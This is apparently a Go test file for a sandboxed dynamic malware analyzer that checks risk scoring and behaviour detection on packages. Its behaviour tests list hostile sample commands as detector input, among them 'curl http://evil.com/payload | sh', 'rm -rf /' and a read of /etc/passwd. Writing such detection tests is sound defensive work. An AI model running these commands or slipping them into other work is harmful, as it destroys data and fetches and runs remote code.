package dynamic

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestNewAnalyzer(t *testing.T) {
	cfg := &Config{
		Enabled:     true,
		SandboxType: "docker",
		SandboxTimeout: "30s",
		MaxConcurrentSandboxes: 5,
	}

	analyzer, err := NewDynamicAnalyzer(cfg)

	if err != nil {
		t.Fatalf("Expected no error, got %v", err)
	}

	if analyzer == nil {
		t.Error("Expected analyzer to be created")
	}

	if !analyzer.config.Enabled {
		t.Error("Expected analyzer to be enabled")
	}

	if analyzer.config.SandboxType != "docker" {
		t.Errorf("Expected sandbox type to be docker, got %s", analyzer.config.SandboxType)
	}
}

func TestNewAnalyzer_Disabled(t *testing.T) {
	cfg := &Config{
		Enabled: false,
	}

	analyzer, err := NewDynamicAnalyzer(cfg)

	if err != nil {
		t.Fatalf("Expected no error, got %v", err)
	}

	if analyzer == nil {
		t.Error("Expected analyzer to be created even when disabled")
	}

	if analyzer.config.Enabled {
		t.Error("Expected analyzer to be disabled")
	}
}

func TestAnalyzePackage_Disabled(t *testing.T) {
	cfg := &Config{
		Enabled: false,
	}

	analyzer, _ := NewDynamicAnalyzer(cfg)

	// Create temporary test directory
	testDir := t.TempDir()

	ctx := context.Background()
	result, err := analyzer.AnalyzePackage(ctx, testDir)

	if err != nil {
		t.Errorf("Expected no error for disabled analyzer, got %v", err)
	}

	if result == nil {
		t.Error("Expected result to not be nil even when disabled")
	}

	if result.RiskScore != 0 {
		t.Errorf("Expected risk score 0 for disabled analyzer, got %f", result.RiskScore)
	}
}

func TestAnalyzePackage_DockerNotAvailable(t *testing.T) {
	cfg := &Config{
		Enabled:     true,
		SandboxType: "docker",
		SandboxImage: "node:16-alpine",
		SandboxTimeout: "60s",
	}

	analyzer, _ := NewDynamicAnalyzer(cfg)

	// Create temporary test directory
	testDir := t.TempDir()

	ctx := context.Background()
	result, err := analyzer.AnalyzePackage(ctx, testDir)

	// Should handle Docker unavailability gracefully
	if err != nil {
		// Error is expected if Docker is not available
		t.Logf("Expected error when Docker is not available: %v", err)
	}

	if result != nil {
		// If result is returned, it should have basic information
		t.Logf("Analysis completed with result: %+v", result)
	}
}

func TestAnalyze_Success(t *testing.T) {
	cfg := &Config{
		Enabled:     true,
		SandboxType: "docker",
		SandboxImage: "node:16-alpine",
		SandboxTimeout: "60s",
	}

	analyzer, _ := NewDynamicAnalyzer(cfg)

	// Create temporary test directory with files
	tempDir, err := os.MkdirTemp("", "dynamic_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Create test package.json
	packageJSON := `{"name": "test-package", "version": "1.0.0", "main": "index.js"}`
	err = os.WriteFile(filepath.Join(tempDir, "package.json"), []byte(packageJSON), 0644)
	if err != nil {
		t.Fatalf("Failed to create package.json: %v", err)
	}

	// Create test index.js
	indexJS := `console.log("Hello from test package");`
	err = os.WriteFile(filepath.Join(tempDir, "index.js"), []byte(indexJS), 0644)
	if err != nil {
		t.Fatalf("Failed to create index.js: %v", err)
	}

	ctx := context.Background()
	result, err := analyzer.AnalyzePackage(ctx, tempDir)

	// Should handle Docker unavailability gracefully
	if err != nil {
		t.Logf("Expected error when Docker is not available: %v", err)
		return // Skip rest of test if Docker is not available
	}

	if result == nil {
		t.Error("Expected result to not be nil")
	}
}

func TestCreateSandbox_Success(t *testing.T) {
	cfg := &Config{
		Enabled:     true,
		SandboxImage: "node:16-alpine",
		MaxMemoryUsage: 256 * 1024 * 1024,
	}

	analyzer, err := NewAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	// Create temporary test directory
	tempDir, err := os.MkdirTemp("", "sandbox_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	ctx := context.Background()
	sandbox, err := analyzer.createSandbox(ctx)

	if err != nil {
		// Expected if Docker is not available
		t.Logf("Expected error when Docker is not available: %v", err)
		return
	}

	if sandbox.ID == "" {
		t.Error("Expected sandbox ID to not be empty")
	}

	// Clean up sandbox if created
	if sandbox != nil {
		_ = analyzer.destroySandbox(sandbox)
	}
}

func TestExecuteInSandbox_Success(t *testing.T) {
	cfg := &Config{
		Enabled:     true,
		SandboxImage: "node:16-alpine",
		SandboxTimeout: "10s",
	}

	analyzer, err := NewAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	// Mock sandbox (since we can't create real containers in tests)
	mockSandbox := &Sandbox{
		ID: "mock-sandbox-id",
		Type: "docker",
		Image: "node:16-alpine",
		Status: "running",
	}
	scriptPath := "/tmp/test-script.sh"

	ctx := context.Background()
	result, err := analyzer.executeScriptInSandbox(ctx, mockSandbox, scriptPath)

	// Expected to fail with mock sandbox
	if err == nil {
		t.Error("Expected error with mock sandbox")
	}

	// Result should be nil for failed execution
	if result != nil {
		t.Error("Expected nil result for failed execution")
	}
}

func TestMonitorBehavior_Success(t *testing.T) {
	cfg := &Config{
		Enabled: true,
		SandboxTimeout: "5s",
	}

	analyzer, err := NewAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	// Mock container ID
	containerID := "mock-container-id"

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	behaviors := analyzer.monitorBehavior(ctx, containerID)

	// Should return empty behaviors for mock container
	if len(behaviors) > 0 {
		t.Errorf("Expected no behaviors for mock container, got %d", len(behaviors))
	}
}

func TestAnalyzeBehaviors_NetworkCalls(t *testing.T) {
	cfg := &Config{}
	analyzer, err := NewAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	behaviors := []string{
		"HTTP request to http://malicious.com",
		"DNS lookup for evil.domain.com",
		"TCP connection to 192.168.1.100:4444",
		"File read: /etc/passwd",
		"Process started: /bin/sh",
	}

	findings := analyzer.analyzeBehaviors(behaviors)

	if len(findings) == 0 {
		t.Error("Expected findings for suspicious behaviors")
	}

	// Should detect network-related findings
	foundNetworkFinding := false
	for _, finding := range findings {
		if strings.Contains(strings.ToLower(finding.Description), "network") ||
			strings.Contains(strings.ToLower(finding.Description), "connection") {
			foundNetworkFinding = true
			break
		}
	}

	if !foundNetworkFinding {
		t.Error("Expected to find network-related findings")
	}
}

func TestAnalyzeBehaviors_FileOperations(t *testing.T) {
	cfg := &Config{}
	analyzer, err := NewAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	behaviors := []string{
		"File write: /tmp/malicious_script.sh",
		"File delete: /important/data.txt",
		"Directory creation: /tmp/.hidden",
		"Permission change: chmod 777 /tmp/script.sh",
	}

	findings := analyzer.analyzeBehaviors(behaviors)

	if len(findings) == 0 {
		t.Error("Expected findings for file operations")
	}

	// Should detect file-related findings
	foundFileFinding := false
	for _, finding := range findings {
		if strings.Contains(strings.ToLower(finding.Description), "file") ||
			strings.Contains(strings.ToLower(finding.Description), "permission") {
			foundFileFinding = true
			break
		}
	}

	if !foundFileFinding {
		t.Error("Expected to find file-related findings")
	}
}

func TestAnalyzeBehaviors_ProcessExecution(t *testing.T) {
	cfg := &Config{}
	analyzer, err := NewAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	behaviors := []string{
		"Process started: /bin/bash -c 'rm -rf /'",
		"Process started: curl http://evil.com/payload | sh",
		"Process started: python -c 'import os; os.system(\"evil command\")'",
	}

	findings := analyzer.analyzeBehaviors(behaviors)

	if len(findings) == 0 {
		t.Error("Expected findings for process execution")
	}

	// Should detect process-related findings
	foundProcessFinding := false
	for _, finding := range findings {
		if strings.Contains(strings.ToLower(finding.Description), "process") ||
			strings.Contains(strings.ToLower(finding.Description), "execution") {
			foundProcessFinding = true
			break
		}
	}

	if !foundProcessFinding {
		t.Error("Expected to find process-related findings")
	}
}

func TestCalculateRiskScore(t *testing.T) {
	cfg := &Config{}
	analyzer, err := NewDynamicAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	tests := []struct {
		name        string
		findings    []SecurityFinding
		minScore    float64
		maxScore    float64
	}{
		{
			name:     "no findings",
			findings: []SecurityFinding{},
			minScore: 0,
			maxScore: 0,
		},
		{
			name: "low risk findings",
			findings: []SecurityFinding{
				{Severity: "low"},
				{Severity: "low"},
			},
			minScore: 1.0,
			maxScore: 4.0,
		},
		{
			name: "high risk findings",
			findings: []SecurityFinding{
				{Severity: "high"},
				{Severity: "critical"},
			},
			minScore: 7.0,
			maxScore: 10.0,
		},
		{
			name: "mixed severity findings",
			findings: []SecurityFinding{
				{Severity: "low"},
				{Severity: "medium"},
				{Severity: "high"},
			},
			minScore: 4.0,
			maxScore: 7.0,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			score := analyzer.calculateRiskScore(test.findings)
			if score < test.minScore || score > test.maxScore {
				t.Errorf("calculateRiskScore() = %f, expected between %f and %f",
					score, test.minScore, test.maxScore)
			}
		})
	}
}

func TestGenerateRecommendations(t *testing.T) {
	cfg := &Config{}
	analyzer, err := NewDynamicAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	tests := []struct {
		name        string
		result      *AnalysisResult
		expectedMin int
	}{
		{
			name: "no findings",
			result: &AnalysisResult{
				SecurityFindings: []SecurityFinding{},
				RiskScore: 0.0,
			},
			expectedMin: 0,
		},
		{
			name: "high risk score",
			result: &AnalysisResult{
				SecurityFindings: []SecurityFinding{
					{Type: "network_activity", Severity: "medium"},
				},
				RiskScore: 0.9,
			},
			expectedMin: 2,
		},
		{
			name: "medium risk with network activity",
			result: &AnalysisResult{
				SecurityFindings: []SecurityFinding{
					{Type: "file_operation", Severity: "high"},
				},
				NetworkActivity: []NetworkActivity{
					{Protocol: "HTTP", Domain: "example.com"},
				},
				RiskScore: 0.5,
			},
			expectedMin: 3,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			analyzer.generateRecommendations(test.result)
			if len(test.result.Recommendations) < test.expectedMin {
				t.Errorf("generateRecommendations() returned %d recommendations, expected at least %d",
					len(test.result.Recommendations), test.expectedMin)
			}

			// Check that recommendations are not empty
			for i, rec := range test.result.Recommendations {
				if rec == "" {
					t.Errorf("Recommendation %d is empty", i)
				}
			}
		})
	}
}

func TestCleanupSandbox(t *testing.T) {
	cfg := &Config{
		Enabled: true,
	}

	analyzer, err := NewDynamicAnalyzer(cfg)
	if err != nil {
		t.Fatalf("Failed to create analyzer: %v", err)
	}

	// Test cleanup with mock container ID
	mockContainerID := "mock-container-id"
	ctx := context.Background()

	err = analyzer.cleanupSandbox(ctx, mockContainerID)

	// Expected to fail with mock container ID
	if err == nil {
		t.Error("Expected error when cleaning up mock container")
	}
}